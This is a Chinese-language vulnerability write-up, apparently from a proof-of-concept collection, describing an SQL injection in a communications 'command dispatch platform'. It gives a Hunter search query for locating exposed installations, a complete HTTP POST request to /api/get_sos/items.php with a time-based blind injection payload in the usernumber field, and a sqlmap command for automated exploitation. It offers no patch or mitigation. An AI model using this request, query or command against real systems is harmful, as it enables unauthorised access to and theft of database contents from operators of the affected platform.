# 指挥调度平台usernumber存在SQL注入漏洞

# 一、漏洞简介
<font style="color:rgb(51, 51, 51);">指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。</font>指挥调度平台usernumber存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 指挥调度平台

# 三、资产测绘
+ hunter`web.body="app/structure/departments.php"`
+ 特征

![1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74.png](./img/xEaSzFspIi7a8WRB/1701096622884-9c34ec74-7f59-464c-b435-5a6ccd465c74-654779.png)

# 四、漏洞复现
```plain
POST /api/get_sos/items.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=4c1e6025b94bac25c4ec63e4affec7cd; authcode=3hqs
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 74

sign=7a6f931dde8e8aafbbfa4d2bcab475e6&timestamp=1686020152221&usernumber=1' AND (SELECT 5464 FROM (SELECT(SLEEP(5)))FZxX) AND 'khLM'='khLM
```

![1701143980161-27f11348-a6a0-42f5-9252-b3d4379e63a7.png](./img/xEaSzFspIi7a8WRB/1701143980161-27f11348-a6a0-42f5-9252-b3d4379e63a7-804570.png)

sqlmap

```plain
sqlmap -r 2.txt --batch -p usernumber
```

![1701143998178-09bee0f6-0d3e-4ee7-a4dd-320c79bc10b4.png](./img/xEaSzFspIi7a8WRB/1701143998178-09bee0f6-0d3e-4ee7-a4dd-320c79bc10b4-121402.png)



> 更新: 2024-02-29 23:55:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rnocaiwi1rqd0dx5>